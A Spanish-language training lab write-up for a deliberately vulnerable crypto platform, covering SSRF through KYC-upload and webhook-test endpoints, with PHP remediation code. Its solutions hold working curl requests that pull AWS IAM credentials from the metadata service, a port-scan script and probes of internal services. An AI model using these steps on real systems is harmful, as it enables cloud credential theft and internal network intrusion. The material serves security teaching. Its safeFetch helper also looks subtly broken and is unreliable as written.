# LAB 07 - Server Side Request Forgery (SSRF)

## Referencia OWASP: API7:2023 - Server Side Request Forgery

---

## Objetivo

Explotar vulnerabilidades de SSRF en la plataforma CryptoVulnX para:

1. Acceder a metadatos de la nube (AWS/GCP) a traves del endpoint de carga KYC.
2. Realizar escaneo de puertos internos mediante el parametro `file_url`.
3. Acceder a servicios internos a traves de la funcionalidad de prueba de webhooks.

---

## Contexto

La vulnerabilidad SSRF (Server Side Request Forgery) ocurre cuando una aplicacion del lado del servidor realiza solicitudes HTTP a URLs proporcionadas por el usuario sin validacion adecuada. Esto permite a un atacante hacer que el servidor actue como proxy para acceder a recursos internos que normalmente no serian accesibles desde el exterior.

En CryptoVulnX, existen dos endpoints vulnerables:

1. **KYC Upload** (`/api/v1/kyc/upload.php`): Para verificar la identidad del usuario, la plataforma permite subir documentos mediante una URL. El servidor descarga el archivo desde la URL proporcionada en el parametro `file_url` sin validar si la URL apunta a un recurso interno, a la instancia de metadatos de la nube, o a puertos de servicios internos.

2. **Webhook Notify** (`/api/v1/webhook/notify.php`): La funcionalidad de webhooks permite al usuario configurar una URL de notificacion y probarla con `action=test`. El servidor realiza una solicitud HTTP a la URL configurada y devuelve el cuerpo completo de la respuesta, incluyendo campos como `response_body`, `effective_url`, `http_code` y `content_type`.

Ambos endpoints actuan como proxies no intencionados, permitiendo al atacante pivotar hacia la red interna.

---

## Endpoints Involucrados

| Metodo | Endpoint | Descripcion |
|--------|----------|-------------|
| `POST` | `/api/v1/kyc/upload.php` | Carga de documentos KYC via URL (parametro `file_url`) |
| `POST` | `/api/v1/webhook/notify.php` | Prueba de webhook (parametro `action=test`, `webhook_url`) |

---

## Dificultad

**Media-Alta** - Requiere conocimiento de redes internas, servicios de metadatos en la nube y tecnicas de escaneo mediante SSRF.

---

## Pistas

<details>
<summary>Pista 1 - Reconocimiento</summary>

Observa el parametro `file_url` en el endpoint de KYC. ¿Que sucede si en lugar de una URL publica proporcionas una URL que apunte a `http://127.0.0.1` o `http://localhost`? ¿El servidor intenta hacer la solicitud?

</details>

<details>
<summary>Pista 2 - Servicios de metadatos</summary>

Los proveedores de nube (AWS, GCP, Azure) exponen metadatos de la instancia en direcciones IP especiales. En AWS, la direccion es `http://169.254.169.254/latest/meta-data/`. Si el servidor esta en la nube, intenta acceder a esta direccion a traves del parametro `file_url`. Tambien prueba con `http://localhost` seguido de diferentes puertos comunes (3306, 6379, 5432, 8080).

</details>

<details>
<summary>Pista 3 - Exfiltracion completa</summary>

El endpoint de webhook con `action=test` devuelve el cuerpo completo de la respuesta del servidor interno en el campo `response_body`. Configura un webhook apuntando a servicios internos como bases de datos, paneles de administracion o APIs internas. La respuesta incluye `effective_url`, `http_code` y `content_type`, lo que te permite mapear la infraestructura interna.

</details>

---

## Solucion

### Solucion 1: Acceso a Metadatos de la Nube via KYC Upload

**Paso 1**: Autenticarse y obtener un token JWT.

```bash
TOKEN=$(curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \
  -H "Content-Type: application/json" \
  -d '{"email":"user@test.com","password":"password123"}' | \
  python -c "import sys,json; print(json.load(sys.stdin)['token'])")
```

**Paso 2**: Enviar solicitud de KYC con URL apuntando a metadatos de AWS.

```bash
curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "document_type": "passport",
    "file_url": "http://169.254.169.254/latest/meta-data/"
  }'
```

Respuesta esperada:
```json
{
  "status": "success",
  "message": "Documento recibido para verificacion",
  "file_content": "ami-id\nami-launch-index\nami-manifest-path\nhostname\niam/\ninstance-id\ninstance-type\nlocal-hostname\nlocal-ipv4\npublic-hostname\npublic-ipv4\nsecurity-credentials/",
  "content_type": "text/plain",
  "effective_url": "http://169.254.169.254/latest/meta-data/"
}
```

**Paso 3**: Profundizar para obtener credenciales IAM.

```bash
curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "document_type": "passport",
    "file_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
  }'
```

Respuesta esperada:
```json
{
  "status": "success",
  "file_content": "ec2-role-cryptovulnx",
  "effective_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
}
```

**Paso 4**: Obtener las credenciales temporales de AWS.

```bash
curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "document_type": "passport",
    "file_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-cryptovulnx"
  }'
```

Respuesta esperada:
```json
{
  "status": "success",
  "file_content": "{\"Code\":\"Success\",\"AccessKeyId\":\"AKIAIOSFODNN7EXAMPLE\",\"SecretAccessKey\":\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\"Token\":\"FwoGZXIvYXdzE...\",\"Expiration\":\"2026-03-28T18:00:00Z\"}",
  "effective_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-role-cryptovulnx"
}
```

---

### Solucion 2: Escaneo de Puertos Internos via KYC Upload

**Paso 1**: Escanear el puerto de MySQL (3306).

```bash
curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "document_type": "id_card",
    "file_url": "http://localhost:3306/"
  }'
```

Respuesta esperada (el servidor MySQL responde con su banner):
```json
{
  "status": "success",
  "file_content": "5.7.38-0ubuntu0.18.04.1\u0000...",
  "content_type": "application/octet-stream",
  "http_code": 0,
  "error_detail": "Received HTTP code 0 from proxy after CONNECT"
}
```

**Paso 2**: Escanear multiples puertos internos.

```bash
#!/bin/bash
# port_scan_ssrf.sh - Escaneo de puertos via SSRF

TOKEN="<tu_token_jwt>"
PORTS=(80 443 3306 6379 5432 8080 8443 9200 27017 11211)

for PORT in "${PORTS[@]}"; do
    RESP=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
      http://localhost/appsec/api/v1/kyc/upload.php \
      -H "Content-Type: application/json" \
      -H "Authorization: Bearer $TOKEN" \
      -d "{\"document_type\":\"id_card\",\"file_url\":\"http://127.0.0.1:${PORT}/\"}" \
      --max-time 5)

    echo "Puerto $PORT -> HTTP Response: $RESP"
done
```

**Paso 3**: Escanear Redis (puerto 6379).

```bash
curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "document_type": "id_card",
    "file_url": "http://127.0.0.1:6379/"
  }'
```

---

### Solucion 3: Acceso a Servicios Internos via Webhook

**Paso 1**: Registrar un webhook apuntando a un servicio interno.

```bash
curl -s -X POST http://localhost/appsec/api/v1/webhook/notify.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "action": "create",
    "event": "swap_completed",
    "webhook_url": "http://127.0.0.1:8080/admin/status"
  }'
```

Respuesta esperada:
```json
{
  "status": "success",
  "webhook_id": 15,
  "message": "Webhook registrado correctamente"
}
```

**Paso 2**: Probar el webhook para obtener la respuesta del servicio interno.

```bash
curl -s -X POST http://localhost/appsec/api/v1/webhook/notify.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "action": "test",
    "webhook_id": 15
  }'
```

Respuesta esperada:
```json
{
  "status": "success",
  "test_result": {
    "http_code": 200,
    "response_body": "{\"server\":\"internal-admin-panel\",\"version\":\"2.1.0\",\"db_host\":\"10.0.1.50\",\"db_name\":\"cryptovulnx_prod\",\"active_users\":1542,\"uptime\":\"47 days\"}",
    "effective_url": "http://127.0.0.1:8080/admin/status",
    "content_type": "application/json",
    "response_time_ms": 12
  }
}
```

**Paso 3**: Explorar otros servicios internos cambiando la URL del webhook.

```bash
# Acceder a Elasticsearch interno
curl -s -X POST http://localhost/appsec/api/v1/webhook/notify.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "action": "create",
    "event": "deposit",
    "webhook_url": "http://10.0.1.100:9200/_cat/indices"
  }'

# Probar
curl -s -X POST http://localhost/appsec/api/v1/webhook/notify.php \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{
    "action": "test",
    "webhook_id": 16
  }'
```

Respuesta esperada:
```json
{
  "status": "success",
  "test_result": {
    "http_code": 200,
    "response_body": "green open transactions  5 1 1250000 0 2.1gb 1.0gb\ngreen open user_logs    5 1  890000 0 1.5gb 750mb\ngreen open audit_trail  5 1  450000 0 800mb 400mb",
    "effective_url": "http://10.0.1.100:9200/_cat/indices",
    "content_type": "text/plain"
  }
}
```

---

## Remediacion

### 1. Validacion de URLs con Lista Blanca de Dominios

```php
<?php
// helpers/url_validator.php

function validateExternalUrl(string $url): bool {
    $parsed = parse_url($url);

    if (!$parsed || !isset($parsed['host'])) {
        return false;
    }

    $host = strtolower($parsed['host']);

    // Solo permitir esquemas HTTP y HTTPS
    $allowed_schemes = ['http', 'https'];
    if (!in_array(strtolower($parsed['scheme'] ?? ''), $allowed_schemes)) {
        return false;
    }

    // Resolver el hostname a IP para detectar redireccion a IPs internas
    $resolved_ip = gethostbyname($host);

    // Bloquear IPs privadas y reservadas
    $blocked_ranges = [
        '127.0.0.0/8',       // Loopback
        '10.0.0.0/8',        // Privada Clase A
        '172.16.0.0/12',     // Privada Clase B
        '192.168.0.0/16',    // Privada Clase C
        '169.254.0.0/16',    // Link-local (metadatos cloud)
        '0.0.0.0/8',         // Red actual
        'fc00::/7',          // IPv6 privada
        '::1/128',           // IPv6 loopback
    ];

    foreach ($blocked_ranges as $range) {
        if (ipInRange($resolved_ip, $range)) {
            return false;
        }
    }

    // Lista blanca de dominios permitidos (opcional)
    $allowed_domains = [
        'storage.googleapis.com',
        's3.amazonaws.com',
        'cdn.cryptovulnx.com'
    ];

    $domain_allowed = false;
    foreach ($allowed_domains as $allowed) {
        if ($host === $allowed || str_ends_with($host, '.' . $allowed)) {
            $domain_allowed = true;
            break;
        }
    }

    return $domain_allowed;
}

function ipInRange(string $ip, string $range): bool {
    if (strpos($range, '/') === false) {
        return $ip === $range;
    }

    list($subnet, $mask) = explode('/', $range);
    $ip_long = ip2long($ip);
    $subnet_long = ip2long($subnet);

    if ($ip_long === false || $subnet_long === false) {
        return false;
    }

    $mask_long = -1 << (32 - (int)$mask);
    return ($ip_long & $mask_long) === ($subnet_long & $mask_long);
}
```

### 2. Aplicar Validacion en el Endpoint KYC

```php
<?php
// kyc/upload.php - Corregido

require_once __DIR__ . '/../helpers/url_validator.php';

$file_url = $data['file_url'] ?? null;

if ($file_url) {
    if (!validateExternalUrl($file_url)) {
        http_response_code(400);
        echo json_encode([
            "error" => "URL no permitida. Solo se aceptan URLs de dominios autorizados.",
            "allowed_domains" => ["storage.googleapis.com", "s3.amazonaws.com", "cdn.cryptovulnx.com"]
        ]);
        exit;
    }

    // Descargar con restricciones adicionales
    $ch = curl_init($file_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_MAXFILESIZE, 5 * 1024 * 1024); // Max 5MB
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false); // No seguir redirecciones
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS); // Solo HTTPS
    $content = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($http_code !== 200) {
        http_response_code(400);
        echo json_encode(["error" => "No se pudo descargar el archivo"]);
        exit;
    }
}
```

### 3. No Devolver el Cuerpo de Respuesta en Webhooks

```php
<?php
// webhook/notify.php - Corregido

if ($action === 'test') {
    // Validar URL del webhook antes de hacer la solicitud
    if (!validateExternalUrl($webhook['url'])) {
        http_response_code(400);
        echo json_encode(["error" => "URL del webhook no permitida"]);
        exit;
    }

    $ch = curl_init($webhook['url']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS);
    curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    // NUNCA devolver el cuerpo de la respuesta al usuario
    echo json_encode([
        "status" => "success",
        "test_result" => [
            "reachable" => ($http_code >= 200 && $http_code < 300),
            "http_code" => $http_code,
            "message" => "Webhook probado exitosamente"
            // NO incluir response_body ni effective_url
        ]
    ]);
}
```

### 4. Desactivar Redireccion DNS Rebinding

```php
<?php
// Proteccion adicional contra DNS rebinding

function safeFetch(string $url): array {
    // Resolver DNS primero
    $parsed = parse_url($url);
    $resolved_ip = gethostbyname($parsed['host']);

    // Validar la IP resuelta
    if (!validateExternalUrl("http://{$resolved_ip}/")) {
        return ['error' => 'IP resuelta no permitida'];
    }

    // Usar la IP resuelta directamente para evitar re-resolucion DNS
    $safe_url = str_replace($parsed['host'], $resolved_ip, $url);

    $ch = curl_init($safe_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Host: {$parsed['host']}"]);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    curl_close($ch);

    return [
        'body' => $response,
        'http_code' => $info['http_code']
    ];
}
```
